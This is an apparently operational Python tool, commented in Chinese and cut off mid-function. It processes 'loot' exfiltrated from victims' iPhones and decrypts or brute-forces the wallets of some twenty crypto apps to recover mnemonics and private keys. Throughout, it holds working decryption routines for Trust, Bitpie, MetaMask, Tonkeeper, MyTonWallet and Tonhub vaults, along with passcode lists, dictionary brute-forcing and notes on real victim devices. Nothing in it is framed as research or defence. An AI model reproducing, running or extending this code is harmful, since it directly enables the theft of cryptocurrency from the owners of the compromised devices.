#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""18 链钱包自动解密（对接 exfil18 → 面板）

数据源：loot/<ip>/ext_stats_*.bin(.parsed.json)
  · ext_stats bin 载荷 = JSON{data:<base64>}（复用 parse18.unpack）

解密路径（2026-09-10 定案，两处 double-hex 编码 + Trust 口令存 keychain）：
  Bitpie : keychain 条目 Service=com.bitpie.wallet / Account=seedPhraseEntropy
           Data = hex(hex(entropy))  → 二次 hex 解码 → 16/20/24/28/32B BIP39 熵 → 助记词
  Trust  : keystore v3（path 含 keystore_UTC--）口令不在设备口令里，而是明文存在 keychain：
           Account = 'trustwallet' + basename(keystore).replace('keystore_','')
           Data    = hex(32B 随机口令) → 二次解码即口令原始字节
           解密后明文直接就是 12 词助记词
  地址   : Trust keystore JSON 的 activeAccounts[{address,coin,derivationPath}] 一并回填

输出：data/wallet18.json（lootStore.scan() 注入 mnemonics/seeds/addresses）
参考实现：server/decrypt_wallet18.py（手动版）
"""
import os, sys, json, glob, re, hashlib, time

sys.path.insert(0, '/www/wwwroot/i.131422.com/adm888app')
try:
    from parse18 import unpack          # ext_stats bin = JSON{data:base64,...}
except Exception:
    def unpack(p):
        raw = open(p, 'rb').read()
        try:
            j = json.loads(raw.decode('utf-8'))
            if isinstance(j, dict) and 'data' in j:
                import base64 as _b
                return _b.b64decode(j['data']), j
        except Exception:
            pass
        return raw, None

from mnemonic import Mnemonic
M = Mnemonic('english')
from Crypto.Cipher import AES
from Crypto.Hash import keccak

LOOT = '/www/wwwroot/i.131422.com/loot'
OUT = '/www/wwwroot/i.131422.com/adm888app/data/wallet18.json'
STATE = '/www/wwwroot/i.131422.com/adm888app/data/wallet18_state.json'   # 【增量】每设备已处理文件签名

ENT_LEN = (16, 20, 24, 28, 32)

# 【2026-09-14】CLI 开关：
#   --full            强制全量重扫（忽略增量账本）
#   --dict            深爆破：加载 docs/password_dictionary 弱密码字典（cron 默认关闭）
#   --dict-limit N    本次字典上限（默认取 config dict_limit=2000）
#   --serial S        字典/深爆破只对指定序列号生效（其它设备仍只跑常用口令，避免全站拖慢）
FULL = '--full' in sys.argv
DICT = '--dict' in sys.argv
ONLY_SERIAL = ''
DICT_LIMIT_CLI = 0
# 【2026-09-20】爆破队列支持：
#   --only-run <serial>  只处理该设备（配合 tools/wallet_brute.py 并发队列）
#   --out-file <path>    结果写独立文件（不触碰主 wallet18.json / state，由队列器统一合并）
ONLY_RUN = ''
OUT_FILE = ''
for _i, _a in enumerate(sys.argv):
    if _a == '--serial' and _i + 1 < len(sys.argv):
        ONLY_SERIAL = sys.argv[_i + 1]
    elif _a == '--dict-limit' and _i + 1 < len(sys.argv):
        try:
            DICT_LIMIT_CLI = int(sys.argv[_i + 1])
        except Exception:
            DICT_LIMIT_CLI = 0
    elif _a == '--only-run' and _i + 1 < len(sys.argv):
        ONLY_RUN = sys.argv[_i + 1]
    elif _a == '--out-file' and _i + 1 < len(sys.argv):
        OUT_FILE = sys.argv[_i + 1]

# 已知钱包 bundle → 显示名（用于诊断：设备装了哪些钱包、keychain 里有没有它们的密钥条目）
WALLET_BUNDLES = {
    'com.bitpie.wallet': 'Bitpie', 'com.sixdays.trust': 'Trust', 'im.token.app': 'imToken',
    'io.metamask.MetaMask': 'MetaMask', 'com.tronlink.hdwallet': 'TronLink',
    'com.pandawallet': 'PandaWallet', 'vip.mytokenpocket': 'TokenPocket', 'tokenpocket': 'TokenPocket',
    'com.bitkeep.os': 'Bitget', 'io.bitkeep.os': 'Bitget', 'com.okex.OKExAppstoreFull': 'OKX',
    'exodus-movement.exodus': 'Exodus', 'app.phantom': 'Phantom', 'com.solflare.mobile': 'Solflare',
    'com.coinbase': 'Coinbase', 'org.toshi.distribution': 'Toshi', 'com.uniswap.mobile': 'Uniswap',
    'com.jbig.tonkeeper': 'Tonkeeper', 'com.tonhub.app': 'Tonhub', 'com.kyrd.krystal.ios': 'Krystal',
    # 【2026-09-14 修正】com.global.wallet.ios = App Store「TokenPocket: Crypto & Bitcoin」(TP Global Ltd)
    'com.global.wallet.ios': 'TokenPocket', 'org.mytonwallet.app': 'MyTonWallet',
    'com.binance': 'Binance', 'com.czzhao.binance': 'Binance',
    'so.onekey.wallet': 'OneKey', 'com.chainapsis.keplrwallet': 'Keplr',
    'io.gnosis.multisig.prod.mainnet': 'Gnosis', 'com.dpfbop.zerion': 'Zerion',
    'com.topay.wallts': 'TopayWallet', 'com.balletcrypto.cn': 'Ballet',
}

# 加密态密钥仓库标识：这些条目是钱包自己的密文仓库（服务端无口令解不开），
# 但"有没有"是核心判据 —— 面板必须能一眼看到，否则会被当成普通 keychain 噪声。
# 实测：Bitget `_bitkeep_secure_storage`（BG@@BG_<md5> × N）、
#       Binance `com.binance.SKVS.salt`、OKX `com.okx.service` 等。
SECURE_STORE_MARKS = ('secure_storage', 'securestorage', 'bitkeep_secure', 'skvs')


def parse_cryptos(txt):
    """解析 installed_cryptos.txt → 已安装加密应用 bundle 列表（去掉 _3com.apple.* 噪音后缀）"""
    apps = []
    for ln in (txt or '').split('\n'):
        m = re.match(r'\s*\[Bundle ID\]\s*(\S+)', ln)
        if not m:
            continue
        b = m.group(1)
        b = re.split(r'_3com\.apple', b)[0]
        if b and b not in apps:
            apps.append(b)
    return apps


# ── OKX：Documents_wallet（SQLite）→ 账户级密钥 + 全链地址 ──────────────────────
# 【2026-09-11】OKX 把账户级 xpriv/xpub **明文**写在自己的沙盒 SQLite（Documents/wallet）里，
#   采集器整库拖回 → 服务端内存反序列化即可读。
#   xpriv(32B) 与 xpub(33B) 已验证为配对密钥（secp256k1 点乘一致）→ 是**可用私钥**，非密文。
#   各链地址私钥还需 OKX 的派生函数（实测非标准 BIP32），故此处只回填地址 + 账户密钥对。
OKX_CHAIN = {
    0: 'BTC', 1: 'BTC-Taproot', 2: 'LTC', 3: 'ETH', 4: 'BSC', 5: 'SOL', 6: 'OKT',
    10: 'XRP', 14: 'TRON', 808: 'EOS', 1800: 'SOL', 12300: 'Cosmos', 12500: 'Osmosis',
    13800: 'Kava', 14400: 'IOTA', 14700: 'Axelar', 15400: 'Juno', 16000: 'Arbitrum',
    17700: 'ZKSync', 18000: 'DOGE', 19000: 'Aptos', 19400: 'Sui',
}


def parse_okx_wallet(raw):
    """ext_stats 的 Documents_wallet → {root, wallet, addresses}；失败返回 None"""
    import sqlite3
    if not raw or raw[:15] != b'SQLite format 3':
        return None
    try:
        c = sqlite3.connect(':memory:')
        c.deserialize(raw)
        rw = c.execute('SELECT name FROM root_wallet LIMIT 1').fetchone()
        w = c.execute('SELECT name,xpriv,xpub,backup,cloudBackup,data,createAt FROM wallet LIMIT 1').fetchone()
        if not w:
            return None
        addrs, seen = [], set()
        for cid, addr, pk in c.execute('SELECT chainId,address,publicKey FROM chain_address'):
            if not addr or addr in seen:
                continue
            seen.add(addr)
            addrs.append({'chainId': cid, 'chain': OKX_CHAIN.get(cid, 'chain%d' % cid),
                          'address': addr, 'publicKey': pk or ''})
        return {'root': (rw[0] if rw else ''), 'name': w[0] or '', 'xpriv': (w[1] or '').lower(),
                'xpub': (w[2] or '').lower(), 'backup': w[3], 'cloudBackup': w[4],
                'data_len': len(w[5] or ''), 'createAt': w[6], 'addresses': addrs,
                'addr_total': c.execute('SELECT COUNT(*) FROM chain_address').fetchone()[0]}
    except Exception:
        return None


# ══════════════════════════════════════════════════════════════════════════════
# 18 链「多钱包适配层」（2026-09-11）
#   目标：把各钱包的【可提取物】尽量抽出来，并明确标注「能不能解助记词 / 缺什么」。
#   实证（iPhone16 Plus / 18.6 / CQ5NW7V7LJ 一次采集覆盖 5 钱包）：
#     MetaMask  : persistStore_persist-AccountsController → **地址+派生路径明文**；
#                 vault 在 persistStore_persist-KeyringController，需用户口令（PBKDF2-5000 + AES）
#     Bitget    : Application Support/bk_mmkv/mkv.default 是【未加密 MMKV】→ 地址+路径明文；
#                 助记词条目名在 keychain（_bitkeep_secure_storage/mnemonic_key_uuid），
#                 但密文值不在已采文件里 → 待补采集目标
#     imToken   : Documents/walletsV2/<id>.json = 标准 Web3 keystore（pbkdf2 c=262144）
#                 → 需 imToken「identity 口令」，无口令不可解
#     Trust     : keystore v3 + keychain 口令 → ✅ 已可解
#     Bitpie    : keychain seedPhraseEntropy → ✅ 已可解（本设备未创建钱包）
# ══════════════════════════════════════════════════════════════════════════════

def parse_bitget_mmkv(raw):
    """Bitget 未加密 MMKV → {addresses:[{address,path,label}]}"""
    try:
        txt = raw.decode('utf-8', 'replace')
    except Exception:
        return None
    # MMKV 里是「JSON 套 JSON」，内层引号是转义的 \"  → 先还原再匹配
    txt = txt.replace('\\"', '"')
    seen, addrs = set(), []
    for m in re.finditer(r'"address":"([^"]+)"[^{}]*?"path":"([^"]+)"', txt):
        a, p = m.group(1), m.group(2)
        if a in seen:
            continue
        seen.add(a)
        addrs.append({'address': a, 'path': p, 'label': 'Bitget'})
    if not addrs:
        return None
    return {'app': 'Bitget', 'kind': 'mmkv-plaintext', 'addresses': addrs,
            'mnemonic': None,
            'note': 'MMKV 未加密，地址+派生路径为明文；助记词为密文（keychain mnemonic_key_uuid），暂缺密文值'}


def parse_metamask_persist(raw):
    """MetaMask AccountsController → {addresses:[{address,path}]}；KeyringController → 判断 vault 在不在"""
    try:
        txt = raw.decode('utf-8', 'replace')
        j = json.loads(txt)
    except Exception:
        return None
    addrs, seen = [], set()
    acc = ((j.get('internalAccounts') or {}).get('accounts') or {})
    for _, a in (acc.items() if isinstance(acc, dict) else []):
        if not isinstance(a, dict):
            continue
        ad = a.get('address')
        if not ad or ad in seen:
            continue
        seen.add(ad)
        opt = a.get('options') or {}
        addrs.append({'address': ad, 'path': str(opt.get('derivationPath') or ''), 'label': 'MetaMask'})
    if not addrs:
        return None
    return {'app': 'MetaMask', 'kind': 'asyncstorage-plaintext', 'addresses': addrs,
            'mnemonic': None,
            'note': 'Address 明文；vault(KeyringController) 需用户口令（PBKDF2-5000+AES），无口令不可解'}


def parse_metamask_vault(raw, serial=''):
    """【2026-09-14】MetaMask KeyringController vault（persistStore_persist-KeyringController）：
    browser-passworder 格式 {data: b64(密文+GCM tag), iv: hex, salt: b64,
    keyMetadata: {params: {iterations}}} → PBKDF2-SHA256 + AES-256-GCM 解密；
    口令候选命中（GCM tag 校验通过）即出助记词。"""
    try:
        j = json.loads(raw.decode('utf-8', 'replace'))
    except Exception:
        return None
    v = None
    if isinstance(j, dict):
        v = j.get('vault')
        if isinstance(v, str):
            try:
                v = json.loads(v)
            except Exception:
                v = None
        if v is None and (j.get('data') or j.get('cipher')) and j.get('salt'):
            v = j
    if not isinstance(v, dict) or not (v.get('data') or v.get('cipher')) or not v.get('salt'):
        return None
    import base64 as _b64
    try:
        salt = _b64.b64decode(str(v['salt']) + '=' * (-len(str(v['salt'])) % 4))
        ct = _b64.b64decode(str(v.get('data') or v.get('cipher')))
    except Exception:
        return None
    iv_raw = str(v.get('iv') or '')
    iv = hx(iv_raw)
    if not iv:
        try:
            iv = _b64.b64decode(iv_raw)
        except Exception:
            return None
    if not iv or len(ct) <= 16:
        return None
    iters = 5000
    try:
        iters = int((((v.get('keyMetadata') or {}).get('params') or {}).get('iterations')) or 5000)
    except Exception:
        pass
    from Crypto.Cipher import AES as _AES
    for pw in load_passwords(serial):
        try:
            key = hashlib.pbkdf2_hmac('sha256', pw.encode(), salt, iters, 32)
            pt = _AES.new(key, _AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct[:-16], ct[-16:])
            t = pt.decode('utf-8', 'replace')
        except Exception:
            continue
        mn = find_mnemonic(t) or (t.strip() if M.check(t.strip()) else None)
        return {'app': 'MetaMask', 'kind': 'keyring-vault', 'addresses': [], 'mnemonic': mn,
                'password_hit': pw, 'iterations': iters,
                'note': ('✅ 口令 %s 命中，已解出助记词' % pw) if mn else
                        ('✅ 口令 %s 命中（vault 已解开，明文未含助记词）' % pw)}
    return {'app': 'MetaMask', 'kind': 'keyring-vault', 'addresses': [], 'mnemonic': None,
            'iterations': iters,
            'note': '找到 KeyringController vault（PBKDF2-%d + AES-GCM），常用口令未命中（可 --dict 深爆破）' % iters}


def parse_tonkeeper_vault(items, serial='', jfiles=None):
    """【2026-09-14】Tonkeeper（keeper）：keychain Service=mnemonics_vault_<id> /
    Account=encrypted_chunkN，Data = hex(JSON{salt,N,r,p,ct,kind:"encrypted-scrypt-tweetnacl"})。
    官方实现（tonkeeper/ios ScryptHashBox.swift）：key=scrypt(口令, N=16384, r=8, p=1, dkLen=32)，
    密文=TweetNaCl secretbox，nonce=salt[:24]。MAC 校验通过才算命中。
    实机验证 C677KPJ2QJ：口令 9999 → 12 词助记词。"""
    vaults = {}
    for it in items:
        svc = it.get('service') or ''
        acc = it.get('account') or ''
        if not svc.startswith('mnemonics_vault_'):
            continue
        _mc = re.match(r'^encrypted_chunk(\d+)$', acc)
        if _mc:
            vaults.setdefault(svc, {})[int(_mc.group(1))] = it
    if not vaults:
        return None
    # 地址线索：采集文件路径里带 TON 地址（WalletBalance_<addr> / WalletNFTs_<addr>）
    addrs, seen = [], set()
    for t in (jfiles or []):
        pth = t[1] if isinstance(t, (list, tuple)) and len(t) > 1 else str(t)
        for m in re.findall(r'[EU]Q[A-Za-z0-9_-]{44,48}', str(pth)):
            if m not in seen:
                seen.add(m)
                addrs.append({'addr': m, 'coin': None, 'path': '', 'label': 'Tonkeeper'})
    svc, chunks = sorted(vaults.items())[0]
    if len(chunks) != 1:
        return {'app': 'Tonkeeper', 'kind': 'keychain-scrypt-vault', 'addresses': addrs,
                'mnemonic': None,
                'note': 'vault 为 %d 个 encrypted_chunk 分片，当前仅支持单片' % len(chunks)}
    try:
        import binascii as _bin
        d = json.loads(hx(chunks[0]['data']).decode('utf-8', 'replace'))
        salt = _bin.unhexlify(d['salt'])
        ct = _bin.unhexlify(d['ct'])
        N = int(d.get('N') or 16384)
        rr = int(d.get('r') or 8)
        pp = int(d.get('p') or 1)
    except Exception:
        return None
    try:
        from nacl.secret import SecretBox
    except Exception:
        return None
    nonce = salt[:24]
    for pw in load_passwords(serial):
        try:
            key = hashlib.scrypt(pw.encode(), salt=salt, n=N, r=rr, p=pp, dklen=32,
                                 maxmem=128 * 1024 * 1024)
            pt = SecretBox(key).decrypt(ct, nonce)
        except Exception:
            continue
        t = pt.decode('utf-8', 'replace')
        mn = find_mnemonic(t) or (t.strip() if M.check(t.strip()) else None)
        return {'app': 'Tonkeeper', 'kind': 'keychain-scrypt-vault(pw=%s)' % pw,
                'addresses': addrs, 'mnemonic': mn,
                'vault_id': svc.replace('mnemonics_vault_', '')[:36],
                'note': ('✅ Tonkeeper 口令 %s 命中，已解出助记词' % pw) if mn else
                        ('✅ Tonkeeper 口令 %s 命中（明文未含助记词）' % pw)}
    return {'app': 'Tonkeeper', 'kind': 'keychain-scrypt-vault', 'addresses': addrs,
            'mnemonic': None, 'vault_id': svc.replace('mnemonics_vault_', '')[:36],
            'note': 'Tonkeeper mnemonics_vault 在手（scrypt+tweetnacl），口令未命中'}


def parse_mytonwallet_enclave(items, serial='', jfiles=None):
    """【2026-09-14】MyTonWallet：keychain 硬件钥匙 + 口令包裹 masterKey + AES-GCM 密文。
    官方实现（mytonwallet-org NativeEnclave）：
      hwKey  = keychain org.mytonwallet.native-enclave / mtw_enclave_data（32B 明文）
      cred   = org.mytonwallet.native-enclave.storage / auth:passcode_credential
               = {salt, wrappedMasterKey=base64(AES-GCM(layer1, hwKey))}
      layer1 = base64(AES-GCM(masterKey, kek))，kek = PBKDF2-SHA256(口令, salt, 100000, 32)
      secret#N = base64(AES-GCM(base64(AES-GCM(明文, masterKey)), hwKey))
    实机验证 C677KPJ2QJ：口令 9999 → 12 词助记词（illness visit fan ...）。"""
    hw = cred = None
    secrets = []
    for it in items:
        svc = it.get('service') or ''
        acc = it.get('account') or ''
        if svc == 'org.mytonwallet.native-enclave' and acc == 'mtw_enclave_data':
            hw = it
        elif svc == 'org.mytonwallet.native-enclave.storage' and acc == 'auth:passcode_credential':
            cred = it
        elif svc == 'org.mytonwallet.native-enclave.storage' and acc.startswith('secret#'):
            secrets.append(it)
    if not (hw and cred and secrets):
        return None
    import base64 as _b64

    def _gcm(b64s, key):
        c = _b64.b64decode(b64s)
        return AES.new(key, AES.MODE_GCM, nonce=c[:12]).decrypt_and_verify(c[12:-16], c[-16:])

    try:
        hw_key = hx(hw['data'])
        cv = json.loads(hx(cred['data']).decode('utf-8', 'replace'))
        salt = _b64.b64decode(str(cv['salt']) + '=' * (-len(str(cv['salt'])) % 4))
        wrapped = str(cv['wrappedMasterKey'])
    except Exception:
        return None
    if not hw_key or len(hw_key) != 32:
        return None
    try:
        layer1 = _gcm(wrapped, hw_key).decode('utf-8', 'replace')
    except Exception:
        return None
    for pw in load_passwords(serial):
        try:
            kek = hashlib.pbkdf2_hmac('sha256', pw.encode(), salt, 100000, 32)
            mk = _gcm(layer1, kek)
        except Exception:
            continue
        mn, priv = None, ''
        n_ok = 0
        for s in secrets:
            try:
                inner = _gcm(hx(s['data']).decode('utf-8', 'replace'), hw_key).decode('utf-8', 'replace')
                t = _gcm(inner, mk).decode('utf-8', 'replace').strip()
            except Exception:
                continue
            n_ok += 1
            cand = find_mnemonic(t) or (t if M.check(t) else None)
            if cand and not mn:
                mn = cand
            elif not priv and re.fullmatch(r'(0x)?[0-9a-fA-F]{64}', t):
                priv = t
        if not n_ok:
            continue
        return {'app': 'MyTonWallet', 'kind': 'keychain-enclave(pw=%s)' % pw,
                'addresses': [], 'mnemonic': mn, 'private_key_hex': priv,
                'note': ('✅ MyTonWallet 口令 %s 命中，%d 条 secret 已解开%s' % (
                    pw, n_ok, '，解出助记词' if mn else ''))}
    return {'app': 'MyTonWallet', 'kind': 'keychain-enclave', 'addresses': [],
            'mnemonic': None,
            'note': 'MyTonWallet enclave 存储在手（hwKey + PBKDF2-100k + AES-GCM 双层），口令未命中'}


def scan_generic_keystores(jfiles, items, serial=''):
    """【2026-09-14】通用 Web3 keystore 爆破（兜 TronLink / TokenPocket / 未知钱包）：
    在设备小体积 JSON / AsyncStorage 文件与 keychain Data 里找含 "crypto" 的 keystore JSON，
    用口令候选解（by_serial → 常用 → --dict 弱字典）。MAC 校验通过才算命中，绝不误报。"""
    import binascii
    out, seen = [], set()
    cands = []

    def _try_ks(raw, hint):
        txt = raw.decode('utf-8', 'replace')
        m = re.search(r'\{.*?"crypto".*\}', txt, re.S)
        if not m:
            return None
        try:
            jd = json.loads(m.group(0))
        except Exception:
            return None
        if not isinstance(jd, dict) or 'crypto' not in jd:
            return None
        for pw in load_passwords(serial):
            try:
                pt = ks_decrypt(jd.get('crypto') or {}, pw.encode())
            except Exception:
                pt = None
            if not pt:
                continue
            try:
                t = pt.decode('utf-8').strip()
            except Exception:
                t = ''
            mn = (find_mnemonic(t) if t else None) or (t if t and M.check(t) else None)
            h = (hint or '').lower()
            app = 'Keystore'
            if 'tronlink' in h:
                app = 'TronLink'
            elif 'tokenpocket' in h or 'mytokenpocket' in h:
                app = 'TokenPocket'
            elif 'im.token' in h:
                app = 'imToken'
            addr = str(jd.get('address') or '')
            addrs = [{'addr': addr, 'coin': None, 'path': ''}] if addr else []
            # 明文为 32B 原始私钥（非 utf-8）→ 二进制直接 hex，别走 replace 解码
            priv = t if re.fullmatch(r'[0-9a-fA-F]{64}', t) else ''
            if not priv and len(pt) == 32:
                priv = pt.hex()
            return {'app': app, 'kind': 'generic-keystore', 'addresses': addrs, 'mnemonic': mn,
                    'password_hit': pw, 'private_key_hex': priv, 'src_hint': (hint or '')[:90],
                    'note': ('✅ 口令 %s 命中' % pw) + ('，解出助记词' if mn else
                            ('，明文为私钥（64hex，仅供人工核对）' if priv else '，明文非助记词/私钥格式'))}
        return None

    for jf in (jfiles or []):
        if len(out) >= 8:
            break
        if isinstance(jf, (list, tuple)):
            binp = jf[0]
            hint = ' '.join(str(x) for x in jf[1:])
        else:
            binp, hint = jf, ''
        if binp in seen:
            continue
        seen.add(binp)
        lp = hint.lower()
        # 已由专用解析器处理的文件跳过（避免重复开销）；只排 Bitget 专用 bk_mmkv，不要一刀切 mmkv
        if 'persiststore' in lp or 'walletsv2' in lp or 'bk_mmkv' in lp:
            continue
        cands.append((0 if ('keystore' in lp or 'tronlink' in lp or 'tokenpocket' in lp) else 1, binp, hint))
    # 相关度排序 + 单设备上限（一般设备 ≤200 个候选文件，防全站重扫拖慢）
    cands.sort(key=lambda x: x[0])
    for _, binp, hint in cands[:200]:
        if len(out) >= 8:
            break
        try:
            raw = unpack(binp)[0]
        except Exception:
            continue
        if len(raw) > 524288 or b'"crypto"' not in raw:
            continue
        r = _try_ks(raw, hint)
        if r:
            out.append(r)
    for it in (items or []):
        if len(out) >= 12:
            break
        data = (it.get('data') or '').strip()
        if len(data) < 120 or len(data) > 200000 or len(data) % 2:
            continue
        try:
            raw = binascii.unhexlify(data)
        except Exception:
            continue
        if b'"crypto"' not in raw:
            continue
        r = _try_ks(raw, (it.get('service', '') + ' ' + it.get('account', '')))
        if r:
            out.append(r)
    return out


def parse_imtoken_keystore(raw, serial=''):
    """imToken Documents/walletsV2/<id>.json → keystore 元信息（口令候选命中即可解）"""
    try:
        j = json.loads(raw.decode('utf-8', 'replace'))
    except Exception:
        return None
    if not isinstance(j, dict) or 'crypto' not in j:
        return None
    cr = j.get('crypto') or {}
    kp = cr.get('kdfparams') or {}
    ident = (j.get('identity') or {})
    # 口令字典爆破：ks_decrypt 内部校验 mac，命中即真解
    mn = None
    pw_hit = None
    for pw in load_passwords(serial):
        try:
            pt = ks_decrypt(cr, pw.encode())
        except Exception:
            pt = None
        if not pt:
            continue
        try:
            t = pt.decode('utf-8', 'replace').strip()
        except Exception:
            continue
        cand = find_mnemonic(t) or (t if M.check(t.strip()) else None)
        if cand:
            mn, pw_hit = cand, pw
            break
    return {'app': 'imToken', 'kind': 'web3-keystore', 'addresses': [],
            'mnemonic': mn, 'password_hit': pw_hit,
            'keystore_id': j.get('id', ''), 'fingerprint': j.get('sourceFingerprint', ''),
            'kdf': '%s(c=%s,%s,dklen=%s)' % (cr.get('kdf'), kp.get('c'), kp.get('prf'), kp.get('dklen')),
            'cipher': cr.get('cipher'), 'identifier': ident.get('identifier', ''),
            'note': ('✅ 口令 %s 命中，已解出助记词' % pw_hit) if mn else
                    '标准 Web3 keystore，需 imToken「identity 口令」，当前字典无命中'}


PW_DICT = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'wallet_passwords.json')


def parse_exodus_asyncstorage(raw):
    """Exodus 的 RCTAsyncLocalStorage 文件（2026-09-12 直取系）：
    · 地址表（实测明文）：{"m/44'/501'/0'/0/0":{"synced":true,"address":"..."}} —— 200+ 条全链地址
    · cachedBackups：含 encryptedSecrets（Passkey/WebAuthn 加密）→ 助记词需设备侧解密方可取
    · 返回适配器 dict（addresses 用 lootStore 的 {address,label,path} 格式）"""
    try:
        txt = raw.decode('utf-8', 'replace')
    except Exception:
        return None
    t = txt.lstrip()
    if '"cachedBackups"' in txt and 'encryptedSecrets' in txt:
        return {'app': 'Exodus', 'kind': 'passkey-backup', 'addresses': [], 'mnemonic': None,
                'note': '存在 Exodus 备份（encryptedSecrets，Passkey/credentialId 加密）——'
                        '助记词离线不可解，需设备侧解密；地址见同目录地址表文件'}
    if not t.startswith('{') or '"m/' not in txt[:3000]:
        return None
    try:
        j = json.loads(txt)
    except Exception:
        return None
    addrs = []
    for k, v in (j.items() if isinstance(j, dict) else []):
        if isinstance(v, dict) and v.get('address') and re.match(r"^m/\d", str(k)):
            g = re.match(r"m/(\d+)'/(\d+)'", str(k))
            addrs.append({'address': str(v['address']), 'label': 'Exodus',
                          'path': str(k), 'coin': (int(g.group(2)) if g else None)})
    if not addrs:
        return None
    return {'app': 'Exodus', 'kind': 'exodus-addresses', 'addresses': addrs, 'mnemonic': None,
            'note': 'Exodus 地址表明文 %d 条（含派生路径）；助记词为 Passkey 加密（cachedBackups）' % len(addrs)}


def parse_phantom_mmkv(raw):
    """Phantom 的 SQLite mmkv_backup（2026-09-12 直取系）：
    · vault.accounts → 各链地址（明文：bip122_p2tr/p2wpkh/solana/eip155/sui）
    · vault.secrets → seedIdentifiers / seedlessIdentifiers（空 seed = seedless 钱包，密钥托管服务端）"""
    if not raw or raw[:15] != b'SQLite format 3':
        return None
    import sqlite3
    addrs = []
    seed_n = seedless_n = None
    try:
        con = sqlite3.connect(':memory:')
        con.deserialize(raw)
        for (k, v) in con.execute("SELECT key, value FROM mmkv_backup"):
            try:
                j = json.loads(v)
            except Exception:
                continue
            val = (j or {}).get('value')
            if not isinstance(val, dict):
                continue
            if 'accounts' in val and not addrs:
                for acc in (val.get('accounts') or []):
                    for ck, cv in ((acc or {}).get('chains') or {}).items():
                        if not isinstance(cv, dict):
                            continue
                        ad = cv.get('addresses')
                        if isinstance(ad, dict):
                            for _net, a2 in ad.items():
                                addrs.append({'address': str(a2), 'label': 'Phantom ' + str(ck),
                                              'path': cv.get('pathType') or str(ck)})
                        elif isinstance(cv.get('publicKey'), str):
                            addrs.append({'address': cv['publicKey'], 'label': 'Phantom ' + str(ck),
                                          'path': cv.get('pathType') or str(ck)})
            if 'seedIdentifiers' in val and seed_n is None:
                seed_n = len(val.get('seedIdentifiers') or [])
                seedless_n = len(val.get('seedlessIdentifiers') or [])
        con.close()
    except Exception:
        return None
    if not addrs and seed_n is None:
        return None
    note = 'Phantom vault：seed 钱包 %s / seedless %s' % (seed_n, seedless_n)
    if seed_n == 0:
        note += '（seedless = 密钥托管在 Phantom 服务端，本地无种子词材料）'
    return {'app': 'Phantom', 'kind': 'mmkv-vault', 'addresses': addrs, 'mnemonic': None, 'note': note}


# ── Tonhub（2026-09-12 实机验证 ✅）：4 位 passcode 爆破 + secretbox 双层 ──
#   KDF（官方源码定案）：key = PBKDF2-SHA512(passcode, salt_hex, 100000轮, 32B)
#   appKey = secretbox_open(enc-key, key)；助记词 = secretbox_open(blob, appKey)
#   注意：MMKV 值分隔符（'a'/'`'）会坑正则——用逐字符扫描取 base64 段。
TONHUB_PCS = ['0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999',
              '1234', '4321', '1122', '1221', '1212', '2121', '0123', '3210', '1112', '1290',
              '0070', '0127', '0912', '1004', '1357', '1379', '2468', '2580', '6668', '8880']
_B64CH = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')

def _th_seg_after(txt, anchor, skip=64, minlen=60):
    i = txt.find(anchor)
    if i < 0:
        return None
    j = i + len(anchor) + skip
    n = len(txt)
    while j < n:
        while j < n and txt[j] not in _B64CH:
            j += 1
        k = j
        while k < n and txt[k] in _B64CH:
            k += 1
        if k - j >= minlen:
            return txt[j:k]
        j = k + 1
    return None

def try_tonhub(bins, SecretBox):
    """返回 (助记词, passcode) 或 None。全量 10000 组合见 /tmp/tonhub_brute.py（高价值设备可选）"""
    import hashlib as _hh, base64 as _bb
    for binp in bins:
        try:
            txt = unpack(binp)[0].decode('latin1')
        except Exception:
            continue
        sm = re.search(r'ton-storage-passcode-nacl[A-Za-z@]{0,3}([0-9a-f]{64})', txt)
        if not sm:
            continue
        salt = sm.group(1)
        enc_b64 = _th_seg_after(txt, 'ton-storage-passcode-enc-key-')
        if not enc_b64:
            continue
        try:
            enc = _bb.b64decode(enc_b64 + '=' * (-len(enc_b64) % 4))
        except Exception:
            continue
        app_key = None
        pc_hit = None
        for pc in TONHUB_PCS:
            key = _hh.pbkdf2_hmac('sha512', pc.encode(), salt.encode(), 100000, 32)
            try:
                app_key = SecretBox(key).decrypt(enc)
                pc_hit = pc
                break
            except Exception:
                continue
        if not app_key:
            continue
        for m in re.finditer(r'[A-Za-z0-9+/]{100,2000}={0,3}', txt):
            blob = m.group(0)
            if re.match(r'^[0-9a-f]+$', blob):
                continue
            try:
                pt = SecretBox(app_key).decrypt(_bb.b64decode(blob + '=' * (-len(blob) % 4)))
            except Exception:
                continue
            words = pt.decode('utf-8', 'replace').strip().split()
            if len(words) in (12, 15, 18, 21, 24):
                # TON 助记词用 BIP39 词表但非标准 BIP39 checksum（ton-crypto 自有算法）——
                # 判据 = 词表成员 + secretbox MAC 验证通过（后者已是密码学级确认）。
                wl = set(M.wordlist)
                if all(w in wl for w in words):
                    return (' '.join(words), pc_hit)
    return None


_DICT_CACHE = None
_PW_CACHE = {}


def _load_dict_words():
    """【2026-09-14】弱密码字典（docs/password_dictionary/*）——仅 --dict 启用。
    去重 + 首字母大写变体（TronLink 等强制含大写的钱包），上限 dict_limit。"""
    global _DICT_CACHE
    if _DICT_CACHE is not None:
        return _DICT_CACHE
    try:
        cfg = json.load(open(PW_DICT, encoding='utf-8'))
    except Exception:
        cfg = {}
    limit = DICT_LIMIT_CLI or int(cfg.get('dict_limit') or 2000)
    variants = cfg.get('dict_variants', True)
    words, seen = [], set()
    for fp in (cfg.get('dict_files') or []):
        if len(words) >= limit:
            break
        try:
            fh = open(fp, encoding='utf-8', errors='ignore')
        except Exception:
            continue
        for ln in fh:
            w = ln.strip()
            if not w or w in seen:
                continue
            seen.add(w)
            words.append(w)
            if variants:
                v2 = w[:1].upper() + w[1:]
                if v2 not in seen:
                    seen.add(v2)
                    words.append(v2)
            if len(words) >= limit:
                break
        try:
            fh.close()
        except Exception:
            pass
    _DICT_CACHE = words
    return words


def load_passwords(serial=''):
    """口令候选（按序）：by_serial 专用口令 → 全局常用 → （--dict 且命中 --serial 范围）弱字典。
    命中判据 = keystore MAC / vault GCM tag 校验通过，绝不误报。"""
    dict_on = DICT and (not ONLY_SERIAL or serial == ONLY_SERIAL)
    ck = (serial or '') + ('|dict' if dict_on else '')
    if ck in _PW_CACHE:
        return _PW_CACHE[ck]
    try:
